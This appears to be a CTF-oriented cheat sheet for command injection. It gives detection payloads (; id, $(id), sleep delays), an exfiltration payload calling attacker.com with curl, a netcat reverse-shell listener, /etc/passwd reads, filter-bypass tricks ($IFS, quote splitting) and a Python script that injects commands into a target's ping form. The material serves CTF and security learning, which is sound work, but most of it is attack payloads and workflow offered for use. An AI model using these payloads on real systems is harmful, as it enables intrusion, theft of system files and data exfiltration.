# Command Injection

## Purpose
Execute arbitrary commands directly on the server operating system hosting the target application.

## Decision Tree
```
Check response behavior:
 ├── Command stdout reflected in page? -> In-band Command Injection
 └── No stdout returned?
      ├── Connection callbacks possible? -> Out-of-Band (OOB) via curl/nslookup
      └── Connection blocked? -> Time-based blind (sleep/ping)
```

## Recon Checklist
- [ ] Inspect inputs passed to operating system command utilities (e.g. ping utilities, pdf converters, system backups).
- [ ] Map variables containing system shell syntax.

## Detection Checklist
- [ ] Inject command separator followed by command: `; id`, `| id`, `&& id`.
- [ ] Try backticks `` `id` `` or inline evaluation `$(id)`.

## Recon Workflow
1. Intercept target request form.
2. Inject a simple time delay command (e.g., `; sleep 5`).
3. Analyze response times to determine vulnerability.

## Enumeration
- Identify current user: `whoami`, `id`.
- Identify OS version: `uname -a`, `cat /etc/issue`.
- Locate available binaries: `which python3`, `which nc`, `which curl`.

## Useful Tools
- `scripts/http_listener.py` (to catch reverse shells)
- Netcat (`nc`)

## Quick Commands
```bash
# Start nc listener to receive reverse shell callback
nc -lvnp 4444
```

## Linux Commands
*(Refer to Reverse Shell and Command Injection payloads files)*

## Common Payloads
```bash
; id
$(id)
; sleep 5
; curl http://attacker.com/$(id|base64)
```

## Exploitation Workflow
1. Locate command execution parameter injection point.
2. Determine OS command context (Linux/Windows).
3. Inject shell callback string pointed back to your machine.
4. Interact with the shell.

## Example CTF Scenario
A tool allows users to verify IP connectivity. The backend executes `ping -c 3 $IP` where `$IP` is user input. Inputting `8.8.8.8; cat /etc/passwd` displays the passwd file contents.

## Python Automation Example
```python
import requests
# Exploit ping utility
url = "http://target.com/ping"
payload = {"ip": "8.8.8.8; id"}
r = requests.post(url, data=payload)
if "uid=" in r.text:
    print("[+] Command Injection Vulnerability confirmed!")
    print(r.text)
```

## Common Mistakes
- Not handling space limitations. If spaces are filtered, bypass using `$IFS` (e.g., `;cat$IFS/etc/passwd`).
- Mismatched command shell syntaxes (Windows cmd uses `&` or `|` instead of `;`).

## CTF Tips
- Always check if there are outbound internet connections allowed. If not, use time-based or read file contents into the page response.
- Look out for command parameters sanitization bypasses (like quotes manipulation: `ca""t /et""c/pass""wd`).

## References
- OWASP: Command Injection
- PayloadsAllTheThings: Command Injection
